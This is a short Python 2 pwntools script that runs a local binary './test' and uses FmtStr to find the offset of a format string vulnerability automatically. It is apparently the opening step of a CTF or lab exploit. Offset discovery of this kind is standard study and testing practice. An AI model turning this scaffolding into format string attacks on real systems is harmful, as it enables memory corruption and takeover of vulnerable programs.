from pwn import *

context.log_level = 'debug'

def exec_fmt(payload):
    p = process("./test")
    p.sendline(payload)
    info = p.recv()
    p.close()
    return info

autofmt = FmtStr(exec_fmt)
print autofmt.offset
